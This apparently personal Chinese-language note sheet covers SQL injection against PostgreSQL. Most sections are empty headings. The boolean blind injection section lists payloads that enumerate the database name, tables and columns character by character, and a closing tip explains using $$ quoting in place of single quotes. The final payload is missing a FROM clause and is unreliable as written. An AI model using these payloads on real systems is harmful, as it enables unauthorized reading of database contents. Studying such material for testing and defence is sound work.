## PostgreSQL数据库的注入
### 一、联合注入


### 二、报错注入


### 三、布尔盲注
```sql
--先猜当前数据库的长度
and (select length(current_database())) between 0 and 30

--ascii猜解库名的每个字符
and (select ascii(substr(current_database(),1,1))) between 0 and 30

---猜解数据库的表的个数
and (select count(*) from pg_stat_user_tables) between 0 and 30

--猜解库里的表名的长度
and (select length(relname) from pg_stat_user_tables limit 1 OFFSET 0) between 0 and 30

--猜解表名里面的每个字符
and (select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 OFFSET 0) between 0 and 30

--接下来猜解字段名
and (select+ascii(substr(column_name,1,1)) information_schema.columns where table_name=aaa) between 0 and 30
```

### 四、时间盲注

### 五、PostgreSQL语法注意
此数据库有一个特性，使用like查询子句时，比如：
```SQL
where aaa like '%aaa%';
```
这里单引号可以使用$$代替，如:
```SQL
where aaa like $$%aaa%$$;
```
但是暂时不知道原因！
